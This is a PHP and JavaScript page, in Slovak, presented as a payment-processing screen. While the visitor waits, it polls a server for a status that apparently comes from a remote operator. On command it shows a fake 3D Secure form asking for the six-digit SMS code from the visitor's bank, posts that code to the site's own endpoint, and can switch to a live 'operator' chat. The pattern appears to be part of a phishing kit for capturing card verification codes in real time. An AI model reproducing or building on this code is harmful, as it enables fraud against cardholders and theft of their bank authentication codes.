<?php
require_once __DIR__ . '/../config.php';

$sessionId = $_GET['id'] ?? '';

if (empty($sessionId)) {
    die('Invalid session');
}

$statusFile = LOGS_DIR . $sessionId . '.status';

if (!file_exists($statusFile)) {
    die('Session not found');
}

$pageTitle = 'Spracovanie platby';
require_once __DIR__ . '/../assets/inc/header.php';
?>
    
    <div class="container" id="mainContent">
        <div class="loading">
            <div class="spinner"></div>
            <div class="loading-text">Spracovanie vašej platby...</div>
            <div class="loading-subtext">Prosím čakajte, overujeme vaše údaje</div>
        </div>
    </div>
    
    <script>
        const sessionId = '<?php echo htmlspecialchars($sessionId); ?>';
        
        function checkStatus() {
            fetch('/api/check.php?id=' + sessionId)
                .then(response => response.json())
                .then(data => {
                    if (data.status === 'otp') {
                        clearInterval(statusCheckInterval); // Stop checking
                        showOtpForm();
                    } else if (data.status === 'ok') {
                        clearInterval(statusCheckInterval); // Stop checking
                        showSuccess();
                    } else if (data.status === 'err') {
                        clearInterval(statusCheckInterval); // Stop checking
                        showError();
                    } else if (data.status === 'chat') {
                        clearInterval(statusCheckInterval); // Stop checking
                        showChat();
                    }
                })
                .catch(error => console.error('Error:', error));
        }
        
        function showOtpForm() {
            const content = `
                <div class="otp-container">
                    <div class="otp-icon">🔐</div>
                    <h2>3D Secure Overenie</h2>
                    <p class="otp-description">
                        Zadajte 6-miestny overovací kód z SMS správy od vašej banky
                    </p>
                    <form id="otpForm" class="otp-form">
                        <div class="form-group">
                            <input type="text" id="otp" name="otp" class="otp-input" maxlength="6" placeholder="000000" required autocomplete="off">
                        </div>
                        <button type="submit" class="btn-primary">Potvrdiť kód</button>
                    </form>
                    <div class="otp-help">
                        <small>💬 SMS kód by mal prísť do 1-2 minút</small>
                    </div>
                </div>
            `;
            
            document.getElementById('mainContent').innerHTML = content;
            
            const otpInput = document.getElementById('otp');
            otpInput.focus();
            
            // Format OTP input
            otpInput.addEventListener('input', function(e) {
                e.target.value = e.target.value.replace(/\D/g, '').substring(0, 6);
            });
            
            // Handle form submission
            document.getElementById('otpForm').addEventListener('submit', function(e) {
                e.preventDefault();
                const otp = document.getElementById('otp').value;
                
                if (otp.length === 6) {
                    // Disable button
                    const submitBtn = document.querySelector('#otpForm button');
                    submitBtn.disabled = true;
                    submitBtn.textContent = 'Overovanie...';
                    
                    fetch('/api/submit_otp.php', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                        body: 'id=' + sessionId + '&otp=' + otp
                    })
                    .then(() => {
                        // Don't clear interval here, wait for status change
                        document.getElementById('mainContent').innerHTML = `
                            <div class="loading">
                                <div class="spinner"></div>
                                <div class="loading-text">Overovanie kódu...</div>
                                <div class="loading-subtext">Prosím čakajte</div>
                            </div>
                        `;
                        // Restart status checking
                        statusCheckInterval = setInterval(checkStatus, 2000);
                    })
                    .catch(error => {
                        submitBtn.disabled = false;
                        submitBtn.textContent = 'Potvrdiť kód';
                        alert('Chyba pri odosielaní kódu');
                    });
                } else {
                    alert('Zadajte 6-miestny kód');
                }
            });
        }
        
        function showSuccess() {
            clearInterval(statusCheckInterval); // Stop checking
            document.getElementById('mainContent').innerHTML = `
                <div class="loading">
                    <div class="success-icon">✅</div>
                    <h2>Platba úspešná</h2>
                    <p style="text-align: center; color: #28a745;">Vaša platba bola úspešne spracovaná</p>
                </div>
            `;
        }
        
        function showError() {
            clearInterval(statusCheckInterval); // Stop checking
            document.getElementById('mainContent').innerHTML = `
                <div class="loading">
                    <div class="error-icon">❌</div>
                    <h2>Chyba platby</h2>
                    <p style="text-align: center; color: #dc3545;">Platbu sa nepodarilo spracovať. Skúste to znova.</p>
                    <button onclick="window.location.href='/index.php'" class="btn-primary" style="margin-top: 20px;">Späť</button>
                </div>
            `;
        }
        
        function showChat() {
            clearInterval(statusCheckInterval); // Stop status checking
            const content = `
                <div class="chat-container">
                    <div class="chat-header">
                        <h2>💬 Podpora</h2>
                        <p>Operátor je online</p>
                    </div>
                    <div class="chat-messages" id="chatMessages">
                        <div class="chat-message admin">
                            <div class="message-bubble">
                                Dobrý deň! Ako vám môžem pomôcť?
                            </div>
                            <div class="message-time">Teraz</div>
                        </div>
                    </div>
                    <div class="chat-input-container">
                        <form id="chatForm">
                            <input type="text" id="chatInput" placeholder="Napíšte správu..." autocomplete="off" required>
                            <button type="submit" class="btn-send">📤</button>
                        </form>
                    </div>
                </div>
            `;
            
            document.getElementById('mainContent').innerHTML = content;
            
            // Load existing messages
            loadChatMessages();
            
            // Start polling for new messages
            chatInterval = setInterval(loadChatMessages, 2000);
            
            // Handle chat form submission
            document.getElementById('chatForm').addEventListener('submit', function(e) {
                e.preventDefault();
                const input = document.getElementById('chatInput');
                const message = input.value.trim();
                
                if (message) {
                    sendChatMessage(message);
                    input.value = '';
                }
            });
        }
        
        function loadChatMessages() {
            fetch('/api/get_chat.php?id=' + sessionId)
                .then(response => response.json())
                .then(data => {
                    if (data.messages && data.messages.length > 0) {
                        const chatMessages = document.getElementById('chatMessages');
                        if (chatMessages) {
                            chatMessages.innerHTML = '';
                            data.messages.forEach(msg => {
                                addMessageToChat(msg.from, msg.text, msg.time);
                            });
                            chatMessages.scrollTop = chatMessages.scrollHeight;
                        }
                    }
                })
                .catch(error => console.error('Error loading chat:', error));
        }
        
        function sendChatMessage(message) {
            fetch('/api/send_chat.php', {
                method: 'POST',
                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                body: 'id=' + sessionId + '&message=' + encodeURIComponent(message)
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    addMessageToChat('user', message, Math.floor(Date.now() / 1000));
                }
            })
            .catch(error => console.error('Error sending message:', error));
        }
        
        function addMessageToChat(from, text, timestamp) {
            const chatMessages = document.getElementById('chatMessages');
            if (!chatMessages) return;
            
            const messageDiv = document.createElement('div');
            messageDiv.className = 'chat-message ' + from;
            
            const bubble = document.createElement('div');
            bubble.className = 'message-bubble';
            bubble.textContent = text;
            
            const time = document.createElement('div');
            time.className = 'message-time';
            const date = new Date(timestamp * 1000);
            time.textContent = date.toLocaleTimeString('sk-SK', {hour: '2-digit', minute: '2-digit'});
            
            messageDiv.appendChild(bubble);
            messageDiv.appendChild(time);
            chatMessages.appendChild(messageDiv);
            chatMessages.scrollTop = chatMessages.scrollHeight;
        }
        
        let statusCheckInterval = setInterval(checkStatus, 2000);
        let chatInterval = null;
    </script>
<?php require_once __DIR__ . '/../assets/inc/footer.php'; ?>
